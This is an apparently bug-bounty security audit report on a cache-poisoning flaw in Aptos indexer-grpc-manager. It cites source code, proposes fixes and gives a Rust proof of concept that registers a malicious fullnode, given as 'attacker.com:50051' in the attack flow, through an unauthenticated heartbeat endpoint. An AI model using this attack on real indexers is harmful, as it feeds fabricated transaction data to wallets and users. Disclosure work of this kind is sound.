# Audit Report

## Title
Unauthenticated Fullnode Registration Enables Cache Poisoning in Indexer-gRPC-Manager

## Summary
The indexer-grpc-manager allows unauthenticated registration of malicious "fullnodes" via the public heartbeat endpoint, enabling attackers to inject fabricated transaction data into the cache that gets served to all indexer clients without validation.

## Finding Description

The indexer-grpc-manager serves blockchain transaction data to downstream clients (wallets, explorers, dApps). The vulnerability exists in three critical components:

**1. Unauthenticated Heartbeat Endpoint**

The gRPC service exposes a heartbeat endpoint without any authentication: [1](#0-0) 

Any external client can send heartbeat requests containing fullnode registration information.

**2. Dynamic Fullnode Registration**

The `handle_fullnode_info()` method uses DashMap's `entry().or_insert()` pattern, which creates NEW fullnode entries for any address that doesn't exist: [2](#0-1) 

This means an attacker can register their malicious server as a legitimate fullnode by simply sending a heartbeat with `Info::FullnodeInfo`.

**3. Unvalidated Cache Population**

When DataManager's main loop fetches transactions, it randomly selects from registered fullnodes: [3](#0-2) 

The transaction data received from the selected fullnode is cached directly WITHOUT any validation: [4](#0-3) 

There is no verification that:
- Transactions actually exist on the blockchain
- Transactions have valid signatures
- Transaction versions match expected sequence
- State roots or Merkle proofs are correct
- Chain ID matches

**4. Poisoned Data Served to Clients**

The cached data is then served to all clients requesting transactions: [5](#0-4) 

**Attack Flow:**
1. Attacker creates malicious gRPC server implementing `FullnodeData` service
2. Attacker sends heartbeat to indexer-grpc-manager: `HeartbeatRequest { service_info: ServiceInfo { address: "attacker.com:50051", info: Info::FullnodeInfo(...) } }`
3. MetadataManager registers attacker's server in `fullnodes` DashMap
4. DataManager's loop calls `get_fullnode_for_request()` which may select attacker's fullnode
5. Attacker's server returns fabricated `TransactionsFromNodeResponse` with fake transactions
6. Fake transactions are cached via `put_transactions()`
7. All subsequent client requests receive poisoned transaction data

## Impact Explanation

**Severity: HIGH to CRITICAL**

This vulnerability enables:

- **Data Integrity Violation**: Clients receive fabricated transaction history that never occurred on-chain
- **False Balance Display**: Wallets could show incorrect account balances based on fake transfer events
- **Fake NFT Ownership**: Explorers could display fake NFT mints/transfers
- **dApp Malfunction**: Applications relying on indexer data could make incorrect business logic decisions
- **Financial Loss**: Users could make trading decisions based on fake transaction data
- **Trust Destruction**: Undermines confidence in Aptos ecosystem infrastructure

This meets **High Severity** criteria per Aptos bug bounty:
- **API crashes**: Indexer API serves corrupted data
- **Significant protocol violations**: Data integrity guarantees are violated

Could escalate to **Critical** if fake transaction data leads to direct financial loss scenarios.

## Likelihood Explanation

**Likelihood: HIGH**

- **No authentication required**: Any network client can exploit this
- **Simple attack vector**: Requires only basic gRPC client implementation
- **Persistent impact**: Poisoned cache persists until garbage collection or restart
- **Wide exposure**: Indexer endpoints are typically public-facing for client access
- **Random selection**: Attacker's fullnode has probability 1/N of being selected per request where N is total fullnode count

The attack is highly feasible and requires minimal sophistication.

## Recommendation

Implement multi-layered defenses:

**1. Authentication & Authorization**
```rust
// Add authentication to heartbeat endpoint
async fn heartbeat(
    &self,
    request: Request<HeartbeatRequest>,
) -> Result<Response<HeartbeatResponse>, Status> {
    // Verify authentication token
    let auth_token = request.metadata()
        .get("authorization")
        .ok_or_else(|| Status::unauthenticated("Missing auth token"))?;
    
    self.verify_auth_token(auth_token)
        .map_err(|_| Status::permission_denied("Invalid credentials"))?;
    
    // ... rest of handler
}
```

**2. Static Fullnode Configuration**
```rust
fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
    // Only update existing fullnodes, never create new ones dynamically
    let mut entry = self.fullnodes
        .get_mut(&address)
        .ok_or_else(|| anyhow!("Fullnode not in configured allowlist"))?;
    
    entry.recent_states.push_back(info);
    // ... rest of handler
}
```

**3. Transaction Validation**
```rust
fn put_transactions(&mut self, transactions: Vec<Transaction>) {
    // Validate chain_id matches
    for txn in &transactions {
        if !self.validate_transaction_chain_id(txn) {
            warn!("Invalid chain_id in transaction, skipping");
            return;
        }
        // Could add: version sequence validation, signature checks, etc.
    }
    
    self.cache_size += transactions.iter()
        .map(|t| t.encoded_len())
        .sum::<usize>();
    self.transactions.extend(transactions);
}
```

**4. Network Isolation**
Configure firewall rules to restrict heartbeat endpoint access to trusted fullnode IPs only.

## Proof of Concept

```rust
// PoC: Malicious fullnode registration and cache poisoning
// This would be a Rust integration test

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    HeartbeatRequest, ServiceInfo, 
};
use aptos_protos::indexer::v1::service_info::Info;
use aptos_protos::indexer::v1::FullnodeInfo;
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    GetTransactionsFromNodeRequest,
    TransactionsFromNodeResponse,
    TransactionsOutput,
};
use aptos_protos::transaction::v1::Transaction;
use tonic::{transport::Server, Request, Response, Status};
use tokio_stream::wrappers::ReceiverStream;

// Malicious fullnode implementation
struct MaliciousFullnode;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnode {
    type GetTransactionsFromNodeStream = ReceiverStream<Result<TransactionsFromNodeResponse, Status>>;
    
    async fn get_transactions_from_node(
        &self,
        _request: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        let (tx, rx) = tokio::sync::mpsc::channel(10);
        
        tokio::spawn(async move {
            // Send fabricated transaction data
            let fake_transaction = Transaction {
                version: 12345,
                // ... other fake fields
                ..Default::default()
            };
            
            let response = TransactionsFromNodeResponse {
                response: Some(aptos_protos::internal::fullnode::v1::
                    transactions_from_node_response::Response::Data(
                    TransactionsOutput {
                        transactions: vec![fake_transaction],
                    }
                )),
                chain_id: 1,
            };
            
            let _ = tx.send(Ok(response)).await;
        });
        
        Ok(Response::new(ReceiverStream::new(rx)))
    }
    
    async fn ping(
        &self,
        _request: Request<aptos_protos::internal::fullnode::v1::PingFullnodeRequest>,
    ) -> Result<Response<aptos_protos::internal::fullnode::v1::PingFullnodeResponse>, Status> {
        Ok(Response::new(Default::default()))
    }
}

#[tokio::test]
async fn test_cache_poisoning_via_malicious_fullnode() {
    // 1. Start malicious fullnode server
    let malicious_addr = "[::1]:50051".parse().unwrap();
    tokio::spawn(async move {
        Server::builder()
            .add_service(FullnodeDataServer::new(MaliciousFullnode))
            .serve(malicious_addr)
            .await
            .unwrap();
    });
    
    tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
    
    // 2. Connect to indexer-grpc-manager (assumed running on localhost:50052)
    let mut client = GrpcManagerClient::connect("http://[::1]:50052")
        .await
        .unwrap();
    
    // 3. Send heartbeat to register malicious fullnode
    let heartbeat = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("http://[::1]:50051".to_string()),
            info: Some(Info::FullnodeInfo(FullnodeInfo {
                known_latest_version: Some(100000),
                ..Default::default()
            })),
        }),
    };
    
    let response = client.heartbeat(heartbeat).await;
    assert!(response.is_ok(), "Heartbeat should succeed without auth");
    
    // 4. Wait for DataManager to potentially select malicious fullnode
    tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
    
    // 5. Query transactions - may receive poisoned data
    let get_txns = aptos_protos::indexer::v1::GetTransactionsRequest {
        starting_version: Some(12345),
    };
    
    let response = client.get_transactions(get_txns).await.unwrap();
    let txns = response.into_inner().transactions;
    
    // If malicious fullnode was selected, we'd receive fake transactions
    println!("Received {} transactions (potentially poisoned)", txns.len());
}
```

**Notes:**

This vulnerability is specific to the indexer infrastructure and does NOT affect core blockchain consensus, validator operations, or on-chain state. However, it severely compromises data integrity for all downstream consumers of indexer data (wallets, explorers, analytics tools, dApps), which is critical infrastructure for the Aptos ecosystem.

The fix requires implementing proper authentication for fullnode registration and ideally moving to a static whitelist-based configuration rather than dynamic registration via public endpoints.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L129-146)
```rust
    async fn get_transactions(
        &self,
        request: Request<GetTransactionsRequest>,
    ) -> Result<Response<TransactionsResponse>, Status> {
        let request = request.into_inner();
        let transactions = self
            .data_manager
            .get_transactions(request.starting_version(), MAX_SIZE_BYTES_FROM_CACHE)
            .await
            .map_err(|e| Status::internal(format!("{e}")))?;

        Ok(Response::new(TransactionsResponse {
            transactions,
            chain_id: Some(self.chain_id),
            // Not used.
            processed_range: None,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L217-219)
```rust
            let (address, mut fullnode_client) =
                self.metadata_manager.get_fullnode_for_request(&request);
            trace!("Fullnode ({address}) is picked for request.");
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L257-267)
```rust
                match response_item {
                    Ok(r) => {
                        if let Some(response) = r.response {
                            match response {
                                Response::Data(data) => {
                                    trace!(
                                        "Putting data into cache, {} transaction(s).",
                                        data.transactions.len()
                                    );
                                    self.cache.write().await.put_transactions(data.transactions);
                                },
```
